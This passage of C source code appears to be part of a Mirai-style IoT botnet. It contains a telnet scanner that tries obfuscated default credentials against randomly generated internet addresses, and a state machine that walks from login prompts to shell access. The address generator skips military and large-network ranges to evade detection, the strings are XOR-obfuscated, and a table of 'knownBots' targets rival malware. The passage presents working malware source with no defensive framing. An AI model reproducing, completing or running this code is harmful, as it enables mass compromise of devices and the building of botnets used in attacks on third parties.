	"\xff\xfc\x90\x3c\x19\x61", "\x90\x19\x3c\x51\x61", "\xff\xce\xb9\xe7\xe7\x51\xce\x39", "\x51\xff\x19\x51\x61", "\x51\xe7\xe7\xb9\xe7", "\xf9\xb9\xb9\x61\xd2\x22\x51", "\xd2\x90\x61", "\x39\x19\xd4\x51\xb9\xe4\x39"
};
char * successes[] = {
	"\xa5", "\xf3", "\xdb", "\x7e", "\x03\x65\x51\x3c\x3c", "\x61\xfc\xe7\x61\xfc\x03", "\xe4\x03\x22\xd2\xb9\xc1"
};
char * advances2[] = {
	"\xff\xfc\x90\x3c\x19\x61", "\x90\x19\x3c\x51\x61", "\xff\xce\xb9\xe7\xe7\x51\xce\x39", "\x51\xff\x19\x51\x61", "\xe7\xe7\xb9\xe7", "\xb9\xb9\x61\xd2\x22\x51", "\xd2\x90\x61", "\xd2\xe4\x03\x22\xd2\xb9\xc1", "\xa5", "\xf3",
};
char * leig = "\xd2\x19\xff";


void makeRandomStr(unsigned char * buf, int length) {
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}


struct telstate_t {
    int fd;
    unsigned int ip;
	unsigned int port;
    unsigned char state;
    unsigned char complete;
    unsigned char usernameInd;
    unsigned char passwordInd;
    unsigned char tempDirInd;
    unsigned int totalTimeout;
    unsigned short bufUsed;
    char * sockbuf;
};
const char * get_telstate_host(struct telstate_t * telstate) {
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = telstate -> ip;
    return inet_ntoa(in_addr_ip);
}

void advance_telstate(struct telstate_t * telstate, int new_state) { // advance
    if (new_state == 0) {
        close(telstate->fd);
    }
    telstate->totalTimeout = 0;
    telstate->state = new_state;
    memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}

int negotiate(int sock, unsigned char *buf, int len) {
    unsigned char c;
    switch (buf[1]) {
    case CMD_IAC:
        return 0;
    case CMD_WILL:
    case CMD_WONT:
    case CMD_DO:
    case CMD_DONT:
        c = CMD_IAC;
        send(sock,&c, 1, MSG_NOSIGNAL);
        if (CMD_WONT == buf[1]) c = CMD_DONT;
        else if (CMD_DONT == buf[1]) c = CMD_WONT;
        else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
        else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
        send(sock,&c, 1, MSG_NOSIGNAL);
        send(sock,&(buf[2]), 1, MSG_NOSIGNAL);
        break;
    default:
        break;
    }

    return 0;
}
const char *szk_wcsstri(const char *s1, const char *s2)
{
    if (s1 == NULL || s2 == NULL) return NULL;
    const char *cpws1 = s1, *cpws1_, *cpws2;
    char ch1, ch2;
    int bSame;

    while (*cpws1 != L'\0')
    {
        bSame = 1;
        if (*cpws1 != *s2)
        {
            ch1 = mytoupper(*cpws1);
            ch2 = mytoupper(*s2);

            if (ch1 == ch2)
                bSame = 1;
        }

        if (1 == bSame)
        {
            cpws1_ = cpws1;
            cpws2 = s2;
            while (*cpws1_ != L'\0')
            {
                ch1 = mytoupper(*cpws1_);
                ch2 = mytoupper(*cpws2);

                if (ch1 != ch2)
                    break;

                cpws2++;

                if (*cpws2 == L'\0')
                    return cpws1_-(cpws2 - s2 - 0x01);
                cpws1_++;
            }
        }
        cpws1++;
    }
    return NULL;
}
int contains_string(char *buffer, char ** strings) {
    int num_strings = 0, i = 0;
    for (num_strings = 0; strings[++num_strings] != 0;);
    for (i = 0; i < num_strings; i++) {
        if (szk_wcsstri(buffer, eika(strings[i]))) {
            return 1;
        }
    }
    return 0;
}

uint32_t getPIP() {
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
while(
(o1 == 127) ||
(o1 == 0) ||
(o1 == 3) ||
(o1 == 15) ||
(o1 == 56) ||
(o1 == 10) ||
(o1 == 25) ||
(o1 == 49) ||
(o1 == 50) ||
(o1 == 137) ||
(o1 == 6) ||
(o1 == 7) ||
(o1 == 11) ||
(o1 == 21) ||
(o1 == 22) ||
(o1 == 26) ||
(o1 == 28) ||
(o1 == 29) ||
(o1 == 30) ||
(o1 == 33) ||
(o1 == 55) ||
(o1 == 214) ||
(o1 == 215) ||
(o1 == 192 && o2 == 168) ||
(o1 == 146 && o2 == 17) ||
(o1 == 146 && o2 == 80) ||
(o1 == 146 && o2 == 98) ||
(o1 == 146 && o2 == 154) ||
(o1 == 147 && o2 == 159) ||
(o1 == 148 && o2 == 114) ||
(o1 == 150 && o2 == 125) ||
(o1 == 150 && o2 == 133) ||
(o1 == 150 && o2 == 144) ||
(o1 == 150 && o2 == 149) ||
(o1 == 150 && o2 == 157) ||
(o1 == 150 && o2 == 184) ||
(o1 == 150 && o2 == 190) ||
(o1 == 150 && o2 == 196) ||
(o1 == 152 && o2 == 82) ||
(o1 == 152 && o2 == 229) ||
(o1 == 157 && o2 == 202) ||
(o1 == 157 && o2 == 217) ||
(o1 == 161 && o2 == 124) ||
(o1 == 162 && o2 == 32) ||
(o1 == 155 && o2 == 96) ||
(o1 == 155 && o2 == 149) ||
(o1 == 155 && o2 == 155) ||
(o1 == 155 && o2 == 178) ||
(o1 == 164 && o2 == 158) ||
(o1 == 156 && o2 == 9) ||
(o1 == 167 && o2 == 44) ||
(o1 == 168 && o2 == 68) ||
(o1 == 168 && o2 == 85) ||
(o1 == 168 && o2 == 102) ||
(o1 == 203 && o2 == 59) ||
(o1 == 204 && o2 == 34) ||
(o1 == 207 && o2 == 30) ||
(o1 == 117 && o2 == 55) ||
(o1 == 117 && o2 == 56) ||
(o1 == 80 && o2 == 235) ||
(o1 == 207 && o2 == 120) ||
(o1 == 209 && o2 == 35) ||
(o1 == 64 && o2 == 70) ||
(o1 == 172 && o2 >= 16 && o2 < 32) ||
(o1 == 100 && o2 >= 64 && o2 < 127) ||
(o1 == 169 && o2 == 254) ||
(o1 == 198 && o2 >= 18 && o2 < 20) ||
(o1 == 64 && o2 >= 69 && o2 < 227) ||
(o1 == 128 && o2 >= 35 && o2 < 237) ||
(o1 == 129 && o2 >= 22 && o2 < 255) ||
(o1 == 130 && o2 >= 40 && o2 < 168) ||
(o1 == 131 && o2 >= 3 && o2 < 251) ||
(o1 == 132 && o2 >= 3 && o2 < 251) ||
(o1 == 134 && o2 >= 5 && o2 < 235) ||
(o1 == 136 && o2 >= 177 && o2 < 223) ||
(o1 == 138 && o2 >= 13 && o2 < 194) ||
(o1 == 139 && o2 >= 31 && o2 < 143) ||
(o1 == 140 && o2 >= 1 && o2 < 203) ||
(o1 == 143 && o2 >= 45 && o2 < 233) ||
(o1 == 144 && o2 >= 99 && o2 < 253) ||
(o1 == 146 && o2 >= 165 && o2 < 166) ||
(o1 == 147 && o2 >= 35 && o2 < 43) ||
(o1 == 147 && o2 >= 103 && o2 < 105) ||
(o1 == 147 && o2 >= 168 && o2 < 170) ||
(o1 == 147 && o2 >= 198 && o2 < 200) ||
(o1 == 147 && o2 >= 238 && o2 < 255) ||
(o1 == 150 && o2 >= 113 && o2 < 115) ||
(o1 == 152 && o2 >= 151 && o2 < 155) ||
(o1 == 153 && o2 >= 21 && o2 < 32) ||
(o1 == 155 && o2 >= 5 && o2 < 10) ||
(o1 == 155 && o2 >= 74 && o2 < 89) ||
(o1 == 155 && o2 >= 213 && o2 < 222) ||
(o1 == 157 && o2 >= 150 && o2 < 154) ||
(o1 == 158 && o2 >= 1 && o2 < 21) ||
(o1 == 158 && o2 >= 235 && o2 < 247) ||
(o1 == 159 && o2 >= 120 && o2 < 121) ||
(o1 == 160 && o2 >= 132 && o2 < 151) ||
(o1 == 64 && o2 >= 224 && o2 < 227) ||
(o1 == 162 && o2 >= 45 && o2 < 47) ||
(o1 == 163 && o2 >= 205 && o2 < 207) ||
(o1 == 164 && o2 >= 45 && o2 < 50) ||
(o1 == 164 && o2 >= 217 && o2 < 233) ||
(o1 == 169 && o2 >= 252 && o2 < 254) ||
(o1 == 199 && o2 >= 121 && o2 < 254) ||
(o1 == 205 && o2 >= 1 && o2 < 118) ||
(o1 == 207 && o2 >= 60 && o2 < 62) ||
(o1 == 104 && o2 >= 16 && o2 < 31) ||
(o1 == 188 && o2 == 166) ||
(o1 == 188 && o2 == 226) ||
(o1 == 159 && o2 == 203) ||
(o1 == 162 && o2 == 243) ||
(o1 == 45 && o2 == 55) ||
(o1 == 178 && o2 == 62) ||
(o1 == 104 && o2 == 131) ||
(o1 == 104 && o2 == 236) ||
(o1 == 107 && o2 == 170) ||
(o1 == 138 && o2 == 197) ||
(o1 == 138 && o2 == 68) ||
(o1 == 139 && o2 == 59) ||
(o1 == 146 && o2 == 185 && o3 >= 128 && o3 < 191) ||
(o1 == 163 && o2 == 47 && o3 >= 10 && o3 < 11) ||
(o1 == 174 && o2 == 138 && o3 >= 1 && o3 < 127) ||
(o1 == 192 && o2 == 241 && o3 >= 128 && o3 < 255) ||
(o1 == 198 && o2 == 199 && o3 >= 64 && o3 < 127) ||
(o1 == 198 && o2 == 211 && o3 >= 96 && o3 < 127) ||
(o1 == 207 && o2 == 154 && o3 >= 192 && o3 < 255) ||
(o1 == 37 && o2 == 139 && o3 >= 1 && o3 < 31) ||
(o1 == 67 && o2 == 207 && o3 >= 64 && o3 < 95) ||
(o1 == 67 && o2 == 205 && o3 >= 128 && o3 < 191) ||
(o1 == 80 && o2 == 240 && o3 >= 128 && o3 < 143) ||
(o1 == 82 && o2 == 196 && o3 >= 1 && o3 < 15) ||
(o1 == 95 && o2 == 85 && o3 >= 8 && o3 < 63) ||
(o1 == 64 && o2 == 237 && o3 >= 32 && o3 < 43) ||
(o1 == 185 && o2 == 92 && o3 >= 220 && o3 < 223) ||
(o1 == 104 && o2 == 238 && o3 >= 128 && o3 < 191) ||
(o1 == 209 && o2 == 222 && o3 >= 1 && o3 < 31) ||
(o1 == 208 && o2 == 167 && o3 >= 232 && o3 < 252) ||
(o1 == 66 && o2 == 55 && o3 >= 128 && o3 < 159) ||
(o1 == 45 && o2 == 63 && o3 >= 1 && o3 < 127) ||
(o1 == 216 && o2 == 237 && o3 >= 128 && o3 < 159) ||
(o1 == 108 && o2 == 61) ||
(o1 == 45 && o2 == 76) ||
(o1 == 185 && o2 == 11 && o3 >= 144 && o3 < 148) ||
(o1 == 185 && o2 == 56 && o3 >= 21 && o3 < 23) ||
(o1 == 185 && o2 == 61 && o3 >= 136 && o3 < 139) ||
(o1 == 185 && o2 == 62 && o3 >= 187 && o3 < 191) ||
(o1 == 66 && o2 == 150 && o3 >= 120 && o3 < 215) ||
(o1 == 66 && o2 == 151 && o3 >= 137 && o3 < 139) ||
(o1 == 64 && o2 == 94 && o3 >= 237 && o3 < 255) ||
(o1 == 63 && o2 == 251 && o3 >= 19 && o3 < 21) ||
(o1 == 70 && o2 == 42 && o3 >= 73 && o3 < 75) ||
(o1 == 74 && o2 == 91 && o3 >= 113 && o3 < 115) ||
(o1 == 74 && o2 == 201 && o3 >= 56 && o3 < 58) ||
(o1 == 188 && o2 == 209 && o3 >= 48 && o3 < 53) ||
(o1 == 188 && o2 == 165) ||
(o1 == 149 && o2 == 202) ||
(o1 == 151 && o2 == 80) ||
(o1 == 164 && o2 == 132) ||
(o1 == 176 && o2 == 31) ||
(o1 == 167 && o2 == 114) ||
(o1 == 178 && o2 == 32) ||
(o1 == 178 && o2 == 33) ||
(o1 == 37 && o2 == 59) ||
(o1 == 37 && o2 == 187) ||
(o1 == 46 && o2 == 105) ||
(o1 == 51 && o2 == 254) ||
(o1 == 51 && o2 == 255) ||
(o1 == 5 && o2 == 135) ||
(o1 == 5 && o2 == 196) ||
(o1 == 5 && o2 == 39) ||
(o1 == 91 && o2 == 134) ||
(o1 == 104 && o2 == 200 && o3 >= 128 && o3 < 159) ||
(o1 == 107 && o2 == 152 && o3 >= 96 && o3 < 111) ||
(o1 == 107 && o2 == 181 && o3 >= 160 && o3 < 189) ||
(o1 == 172 && o2 == 98 && o3 >= 64 && o3 < 95) ||
(o1 == 184 && o2 == 170 && o3 >= 240 && o3 < 255) ||
(o1 == 192 && o2 == 111 && o3 >= 128 && o3 < 143) ||
(o1 == 192 && o2 == 252 && o3 >= 208 && o3 < 223) ||
(o1 == 192 && o2 == 40 && o3 >= 56 && o3 < 59) ||
(o1 == 198 && o2 == 8 && o3 >= 81 && o3 < 95) ||
(o1 == 199 && o2 == 116 && o3 >= 112 && o3 < 119) ||
(o1 == 199 && o2 == 229 && o3 >= 248 && o3 < 255) ||
(o1 == 199 && o2 == 36 && o3 >= 220 && o3 < 223) ||
(o1 == 199 && o2 == 58 && o3 >= 184 && o3 < 187) ||
(o1 == 206 && o2 == 220 && o3 >= 172 && o3 < 175) ||
(o1 == 208 && o2 == 78 && o3 >= 40 && o3 < 43) ||
(o1 == 208 && o2 == 93 && o3 >= 192 && o3 < 193) ||
(o1 == 66 && o2 == 71 && o3 >= 240 && o3 < 255) ||
(o1 == 98 && o2 == 142 && o3 >= 208 && o3 < 223) ||
(o1 == 107 && o2 >= 20 && o2 < 24) ||
(o1 == 35 && o2 >= 159 && o2 < 183) ||
(o1 == 52 && o2 >= 1 && o2 < 95) ||
(o1 == 52 && o2 >= 95 && o2 < 255) ||
(o1 == 54 && o2 >= 64 && o2 < 95) ||
(o1 == 54 && o2 >= 144 && o2 < 255) ||
(o1 == 13 && o2 >= 52 && o2 < 60) ||
(o1 == 13 && o2 >= 112 && o2 < 115) ||
(o1 == 163 && o2 == 172) ||
(o1 == 51 && o2 >= 15 && o2 < 255) ||
(o1 == 79 && o2 == 121 && o3 >= 128 && o3 < 255) ||
(o1 == 212 && o2 == 47 && o3 >= 224 && o3 < 255) ||
(o1 == 89 && o2 == 34 && o3 >= 96 && o3 < 97) ||
(o1 == 219 && o2 >= 216 && o2 < 231) ||
(o1 == 23 && o2 >= 94 && o2 < 109) ||
(o1 == 178 && o2 >= 62 && o2 < 63) ||
(o1 == 106 && o2 >= 182 && o2 < 189) ||
(o1 == 34 && o2 >= 245 && o2 < 255) ||
(o1 == 87 && o2 >= 97 && o2 < 99) ||
(o1 == 86 && o2 == 208) ||
(o1 == 86 && o2 == 209) ||
(o1 == 193 && o2 == 164) ||
(o1 == 120 && o2 >= 103 && o2 < 108) ||
(o1 == 188 && o2 == 68) ||
(o1 == 78 && o2 == 46) || 	
(o1 == 224));

    return INET_ADDR(o1,o2,o3,o4);
}

int random_number(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand() % (hi_num - low_num)) + low_num;
    return result;
}

 
#ifdef DEBUG
#define SCANNER_MAX_CONNS   512
#define SCANNER_RAW_PPS     8912
#else
#define SCANNER_MAX_CONNS   512
#define SCANNER_RAW_PPS     8912
#endif
 
#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64
 
struct scanner_auth {
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};
typedef uint32_t uint32_t;
struct scanner_connection {
    struct scanner_auth *auth;
    int fd, last_recv;
    enum {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP
    } state;
    uint32_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
};
 
int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;
 
int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);
 
    if (ret > 0)
    {
        int i = 0;
 
        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }
 
    return ret;
}
 
uint32_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);
 
    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }
 
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(1,1,1,1);
    addr.sin_port = HTONS(53);
 
    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}
 
static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};
 
    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }
 
    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));
 
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
 
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;
 
    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}
 
static uint32_t x, y, z, w;
void rand_xywz(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    w = x ^ y;
}
 
uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}
 
static uint32_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
 
    do
    {
        tmp = rand_next();
 
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                     // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                      // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                      // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||         // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                     // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                     // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||       // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||        // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                    // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );
 
    return INET_ADDR(o1,o2,o3,o4);
}
 
static int can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;
 
    return ptr + amount < end;
}
static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;
 
    while (consumed < conn->rdbuf_pos)
    {
        int i;
 
        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
 
                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;
 
                ptr += 3;
                consumed += 3;
 
                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:
 
                if (!can_consume(conn, ptr, 2))
                    break;
 
                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }
 
                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }
 
    return consumed;
}
 
static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;
 
    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }
 
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}
static int consume_shell_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;
 
    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '@')
        {
            prompt_ending = i + 1;
            break;
        }
    }
 
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}
 
static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;
 
    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }
 
    if (prompt_ending == -1)
    {
        int tmp;
 
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }
 
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}
 
static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;
 
    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }
 
    if (prompt_ending == -1)
    {
        int tmp;
 
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }
 
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}
 
static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;
 
    *len = util_strlen(str);
    cpy = malloc(*len + 1);
 
    util_memcpy(cpy, str, *len + 1);
 
    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xAD;
        cpy[i] ^= 0xBE;
        cpy[i] ^= 0xEF;
    }
 
    return cpy;
}
 
static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;
 
    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}
 
static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);
 
    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }
 
    return NULL;
}
 
uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;
 
    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;
 
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}
 
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }
 
    if (len == 1)
        sum += *((uint8_t *) buf);
 
    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += HTONS(iph->protocol);
    sum += data_len;
 
    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);
 
    return ((uint16_t) (~sum));
}

void hex2bin(const char* in, size_t len, unsigned char* out) {

  static const unsigned char TBL[] = {
     0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  58,  59,
    60,  61,  62,  63,  64,  10,  11,  12,  13,  14,  15
  };

  static const unsigned char *LOOKUP = TBL - 48;

  const char* end = in + len;

  while(in < end) *(out++) = LOOKUP[*(in++)] << 4 | LOOKUP[*(in++)];

}
char *knownBots[] = {
    "\x36\x38\x36\x31\x36\x39\x32\x30\x37\x32\x36\x31\x36\x45\x37\x33\x36\x46\x36\x44\x36\x35\x32\x30\x36\x39\x37\x34\x37\x33\x32\x30\x36\x44\x36\x35\x32\x30\x36\x38\x36\x46\x37\x30\x36\x35\x32\x30\x37\x35\x32\x30\x36\x43\x36\x39\x36\x35\x36\x42\x32\x30\x36\x44\x37\x39\x32\x30\x36\x45\x36\x35\x37\x37\x32\x30\x36\x32\x36\x46\x37\x34\x36\x45\x36\x35\x37\x34", // old bot
	"\xcf\x9a\x6f\xcd\x6f\x9d\x6f\x9d\x6f\xe2\xcf\x50\x6f\x2a\x86\x86", "\x86\x14\x2a\x6f\x2a\xcf\x47\x2a\x86\x14\x2a\xcd\x2a\xd0\x47\xe2\x2a\xe2\x86\x14\x47\x47\x2a\xeb\x47\x6f\x2a\xe2\x2a\x9a\x2a\x6f\x2a\x14\x2a\x47", "\xcd\x9d\xa4\xcd\x35\x9d\x9d\x14", "\x6f\x9d\x6f\x35\xcf\xeb\xcf\x2a\x6f\x47\x6f\xda\x6f\x35\x6f\xda\x6f\xcf\x50\x86\xcf\x2a\xcf\x47\x6f\xda\xeb\x86\x86\x86", "\x6f\xda\x6f\x14\x6f\xda\x6f\x9d\x6f\x14\x6f\x47\xcf\x6f\x6f\x2a\x6f\x14", "\x86\xeb\x86\xa4\x86\x50\x6f\x6f\xcf\xcf\xcf\x50", "\xcf\x6f\xcf\xe2\xcf\xcf\x6f\x9d\x6f\xeb\x6f\xcd\x6f\xd0", "\xcf\x50\x6f\xeb\x6f\x9d\x86\x50", "\x47\xa4\x2a\x14\x2a\xda\x2a\xda\x2a\xeb\x47\x86\x2a\x6f", "\xcf\x86\x6f\xcf\xcf\x50\x6f\x14\xcf\x86\xcf\x6f\x86\x50\x86\xcf\x47\xe2\xe2\xa4", "\x2a\x6f\x47\x2a\x47\x86\x2a\x9a\x2a\xcf\x2a\xda\x47\x50\x2a\xcf\x47\x86", "\x2a\x6f\x47\x2a\x47\x86\x47\xe2\x47\xcf\x47\x50\x47\x50\x2a\x14\x47\x86\x47\x6f", "\x2a\xcd\x2a\xd0\x47\x86\x2a\xeb\x2a\xd0", "\x2a\x86\x2a\xda\x2a\xeb\x2a\x6f\x2a\xcf", "\x2a\x6f\x2a\xcf\x2a\xcd\x2a\x14\x2a\x9d", "\x2a\x9a\x2a\x14\x2a\x9a\x2a\x14", "\x2a\x9a\x2a\xeb\x2a\x35\x2a\xeb\x2a\xd0", "\x47\xe2\x2a\xeb\x47\x6f\x2a\x14\x47\x86\x2a\xd0", "\x2a\xcd\x2a\xcf\x47\xe2\x47\xe2\x2a\xd0\x2a\xeb\x2a\x9a", "\x2a\xcd\x2a\xd0\x47\x50\x47\xe2", "\x2a\xcd\x2a\xd0\x47\x50\x47\xe2\x2a\xcf\x2a\xda", "\x47\xe2\x47\xcf\x47\x50\x2a\xcf\x47\x86\x2a\x9a", "\x2a\xeb\x47\x86\x2a\xcd\x47\x2a\xe2\x47", "\x2a\xeb\x47\x86\x2a\xcd\x47\x2a\xe2\x2a", "\x2a\xd0\xe2\x2a\xe2\x9a\xe2\x2a", "\x47\x50\x2a\x14\x47\x47\x2a\xcf\x47\x86\x47\x50\x2a\xe2", "\x2a\xd0\xe2\xcf\xe2\x9a\xe2\x2a", "\x2a\xcd\xe2\x2a\xe2\x9a\x2a\x35", "\x47\xe2\x47\x50\x2a\xeb\x47\x86\x2a\xe2", "\x2a\xeb\x47\x86\x2a\xcd\x47\x2a\xe2\x6f", "\x2a\xeb\x47\x86\x2a\xcd\x47\x2a\xe2\xcf", "\x2a\x35\x2a\x14\x47\xe2\x2a\x9a\x2a\xeb", 